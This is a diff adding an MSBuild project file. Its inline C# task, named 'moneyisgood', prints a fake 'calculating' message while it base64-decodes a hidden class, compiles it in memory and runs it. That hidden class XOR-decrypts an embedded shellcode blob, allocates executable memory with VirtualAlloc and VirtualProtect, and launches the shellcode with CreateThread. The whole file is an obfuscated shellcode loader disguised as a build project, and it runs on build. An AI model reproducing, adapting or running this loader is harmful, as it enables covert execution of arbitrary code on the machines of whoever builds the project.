@@ -1,0 +1,57 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+
+  <Target Name="npscsharp">
+   <moneyisgood />
+  </Target>
+  <UsingTask
+    TaskName="moneyisgood"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+  <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Runtime.InteropServices;
+        using System.Collections.ObjectModel;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        using Microsoft.CSharp;
+        using System.CodeDom.Compiler;
+        using System.Reflection;
+
+        public class moneyisgood : Task, ITask
+        {
+            public override bool Execute()
+            {
+                Console.WriteLine("Application is calculating....please wait");
+                string cmd = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5UZXh0OwpwdWJsaWMgY2xhc3MgUGxhaW5KYW5ldHVzaAp7CiAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgTUVNX0NPTU1JVCA9IDB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBQQUdFX1JFQURXUklURSA9IDB4MDQ7CiAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgUEFHRV9FWEVDVVRFX1JFQUQgPSAweDIwOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBVSW50MzIgVmlydHVhbEFsbG9jKFVJbnQzMiBscFN0YXJ0QWRkciwgVUludDMyIHNpemUsIFVJbnQzMiBmbEFsbG9jYXRpb25UeXBlLCBVSW50MzIgZmxQcm90ZWN0KTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgYWRkcmVzcywgVUludDMyIHNpemUsIFVJbnQzMiBuZXdQcm90ZWN0LCBvdXQgVUludDMyIG9sZFByb3RlY3QpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKAogICAgICAgIFVJbnQzMiBscFRocmVhZEF0dHJpYnV0ZXMsCiAgICAgICAgVUludDMyIGR3U3RhY2tTaXplLAogICAgICAgIFVJbnQzMiBscFN0YXJ0QWRkcmVzcywKICAgICAgICBJbnRQdHIgcGFyYW0sCiAgICAgICAgVUludDMyIGR3Q3JlYXRpb25GbGFncywKICAgICAgICByZWYgVUludDMyIGxwVGhyZWFkSWQKICAgICk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBXYWl0Rm9yU2luZ2xlT2JqZWN0KEludFB0ciBoSGFuZGxlLCBVSW50MzIgZHdNaWxsaXNlY29uZHMpOwogICAgcHVibGljIHZvaWQgRXhlY3V0ZSgpIHsKICAgICAgICBzdHJpbmcgcmF3ID0gQCJXUUV6THl0ekczazNNMXdDQmdZYkhqTmVDVVFmZnhNaEF3TVRiUWRKZXdFUFVqMCtFQVVBSEFRS0lnUU1jeE5MSnpkNlBnODBFVDF1R1FKZ0lIb3VQeTk3TG5NK00wWWpEajB6SHdrdUFHRWpGeTQySTNNU2JBZEtXVGQvSHlrL014VWJmemNxQXhSRkJDQjZGQTBDTERNZk14SStDUkYzRUNnOVd3eGhDQWxiUEZzaUhDWUlOMnBkS1g4eUN5OGdQWEF0ZWw1T1FTc2lFaEVrTXpvWldEd0lMZzR6WkRaWk94d2RDUk5VWUJRekZ3UkJIQmhyQXdoZkRBZ3ZQVnBkS2pKc0JRd29JSDRTTndNa1JRc1BRRnhMZkRvZVZCY2hPeXM0WkJNdlBFTmJaQlJzRHgxOE9oNVhNek1BR0FseVFBODVMaXR6RzA0OUxuUWVLVlVRUlJjN0FuRTRCaW9EUEY4TWV6Z2lhRGd2VmhjeUR6c0NBU0liYXh3NFh6NThEU3gwQ0FjekR6NExBUXBZRXlVUU93a0RGRlFqU2dNbkJDQTlMdzhyR21NU0dCd0JQV29EUVEwWFhWc2RDQ2tQQUY4Q1l5UWxheXM4ZFFoZ09rdDhDQmdqQUVjTEF3cGhKU1VxR1Q0Q01sUTlGbWdJQkNOaEFoY0RCVVFnQ0JBVUpXb0REVDA4V2hZR1Znc0RBQUlGQXhJaktSUW5SUmhwRHp4WEpDVmRPMXByTmlaMEkzdzlMU2RIR1gwN1MzdzZIVlFYSWpzZ1BHVTZKQ3hEVzJnQVNTMFdDd0VzSVJRMEd5WW1WQmNwQ0QwTFdtTnZEekprS1NVS08xcHJPUVpuSTM4VU93dHhhbjhwTWtSQmVqd0JORDQ5R2x3ZkRCY3RLM1V5ZlZZK2FnbGtYQThsUGd4N1hDSVBHeTByZFNwNUR6dHpQd29rR3hvYkxncHlOd2dVQXoxNUNHeGJIQjA0SUZRWElUTUtMR3NYRHhzTEszTVliRGdYVlQwbkNqY2NkVllmZFFFR0Rqd0RSVGw2R1U1cUx5OEFEeXd0WG1kY0YyRjFRMFZJSHcwaEtRWVhCZzh5QUJjRkdRWTZKQjlaSkhNWkQxWTJaUWNkQ0RZMEQwQm5aUT09IjsKICAgICAgICBieXRlW10gc2hlbGxjb2RlID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKHBqbGFkZCgidk5abGoyWjhuejJuS2VZdVpvSDMiLCBCYXNlNjREZWNvZGUocmF3KSkpOwogICAgICAgIFVJbnQzMiBmdW5jQWRkciA9IFZpcnR1YWxBbGxvYygwLCAoVUludDMyKXNoZWxsY29kZS5MZW5ndGgsIE1FTV9DT01NSVQsIFBBR0VfUkVBRFdSSVRFKTsKICAgICAgICBNYXJzaGFsLkNvcHkoc2hlbGxjb2RlLCAwLCAoSW50UHRyKShmdW5jQWRkciksIHNoZWxsY29kZS5MZW5ndGgpOwogICAgICAgIFVJbnQzMiBvbGRQcm90ZWN0OwogICAgICAgIFZpcnR1YWxQcm90ZWN0KChJbnRQdHIpKGZ1bmNBZGRyKSwgKFVJbnQzMilzaGVsbGNvZGUuTGVuZ3RoLCBQQUdFX0VYRUNVVEVfUkVBRCwgb3V0IG9sZFByb3RlY3QpOwogICAgICAgIEludFB0ciBoVGhyZWFkID0gSW50UHRyLlplcm87CiAgICAgICAgVUludDMyIHRocmVhZElkID0gMDsKICAgICAgICBJbnRQdHIgcGluZm8gPSBJbnRQdHIuWmVybzsKICAgICAgICBoVGhyZWFkID0gQ3JlYXRlVGhyZWFkKDAsIDAsIGZ1bmNBZGRyLCBwaW5mbywgMCwgcmVmIHRocmVhZElkKTsKICAgICAgICBXYWl0Rm9yU2luZ2xlT2JqZWN0KGhUaHJlYWQsIDB4RkZGRkZGRkYpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIHBqbGFkZChzdHJpbmcga2V5LCBzdHJpbmcgaW5wdXQpCiAgICB7CiAgICAgICAgU3RyaW5nQnVpbGRlciBzYiA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7CiAgICAgICAgZm9yKGludCBpPTA7IGkgPCBpbnB1dC5MZW5ndGg7IGkrKykKICAgICAgICAgICAgc2IuQXBwZW5kKChjaGFyKShpbnB1dFtpXSBeIGtleVsoaSAlIGtleS5MZW5ndGgpXSkpOwogICAgICAgIFN0cmluZyByZXN1bHQgPSBzYi5Ub1N0cmluZygpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBzdHJpbmcgQmFzZTY0RW5jb2RlKHN0cmluZyB0ZXh0KSB7CiAgICAgICByZXR1cm4gU3lzdGVtLkNvbnZlcnQuVG9CYXNlNjRTdHJpbmcoU3lzdGVtLlRleHQuRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyh0ZXh0KSk7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBzdHJpbmcgQmFzZTY0RGVjb2RlKHN0cmluZyBlbmNvZGVkdGV4dCkgewoJICAgIHJldHVybiBTeXN0ZW0uVGV4dC5FbmNvZGluZy5VVEY4LkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKGVuY29kZWR0ZXh0KSk7CiAgICB9Cn0=";
+                CSharpCodeProvider moneyisgood = new CSharpCodeProvider();
+                CompilerParameters parameters = new CompilerParameters();
+                parameters.ReferencedAssemblies.Add("System.dll");
+                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
+                parameters.GenerateExecutable = false;
+                parameters.GenerateInMemory = true;
+                parameters.IncludeDebugInformation = false;
+                CompilerResults results = moneyisgood.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
+                Assembly assembly = results.CompiledAssembly;
+                object obj = assembly.CreateInstance("PlainJanetush");
+                obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
+                return true;
+            }
+
+            public static string Base64Encode(string text) {
+               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
+            }
+
+            public static string Base64Decode(string encodedtext) {
+                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
